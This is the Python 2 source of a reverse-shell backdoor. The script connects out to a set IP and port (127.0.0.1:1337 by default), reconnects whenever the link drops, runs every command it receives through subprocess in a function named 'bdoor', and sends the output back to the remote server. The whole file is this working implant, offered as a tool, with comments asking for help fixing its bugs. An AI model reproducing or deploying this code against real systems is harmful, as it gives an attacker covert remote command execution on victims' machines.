#!/usr/bin/python
import socket
import sys
import time
import subprocess


# set ip and port in main() if none provided through cli
def main(ip = "127.0.0.1", port = 1337):
    servername= (ip, port)
    connecting = True
    communicate = False
    terminated = False
    # Servers IP, port
    # create a socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error, msg:
        print msg
        sys.exit(1)
    # check for connection, then communicate, and rebuild if terminated
    while True:
        # Connect the socket to a remote server, if connection fails then wait 10 seconds and retry connection
        if connecting:
            try:
                conn = s.connect_ex(servername)
                # print conn
                if conn == 0:
                    print "connected"
                    connecting = False
                    communicate = True
                    terminated = False
                else:
                    print "connection not available, retrying connection in 5 seconds"
                    time.sleep(5)
            except socket.error, msg:
                print 'Error: ', msg
        # loop through send and receive
        if communicate:
            try:
                # send once before the start of the loop so the remote server knows we are ready to receive.
                s.send("Ready :")
                while communicate:
                    try:
                        data = s.recv(1024)
                        print data
                        print "Received: ", data.strip()
                        s.send("Got it!\n")
                        if not data:
                            break
                        s.send(bdoor(data))
                    except socket.error, msg:
                        print "error", msg
                        communicate = False
                        terminated = True
                        s.close()
            # return to connecting state if sending fails.
            except socket.error:
                print "Connection severed! Retrying to connect..."
                communicate = False
                terminated = True
        # rebuild socket
        if terminated:
            try:
                connecting = True
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            except socket.error, msg:
                print msg
                sys.exit(1)

# exec sent command
def bdoor(command):
    # Uncomment the following lines for debugging
    # print "command ", command
    # print "command is a ", type(command)
    # print commandList[0:]
    commandList = command.split()
    # very buggy and working on fixing issues... any help? Tried passing command into subprocess but it fails.
    try:
        process = subprocess.Popen(
            commandList,
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE
        )
        print process
        cmdout, cmderr = process.communicate()
        print cmdout, cmderr
        return cmdout
    except OSError:
        error = "%s - Invalid command, " % (command)
        return error

# if ran from a shell, check for passed in arguments from cli, if none then use defaults
# if running from cli, usage is ./shell.py "IP" "port"
if __name__ == "__main__":
        main()
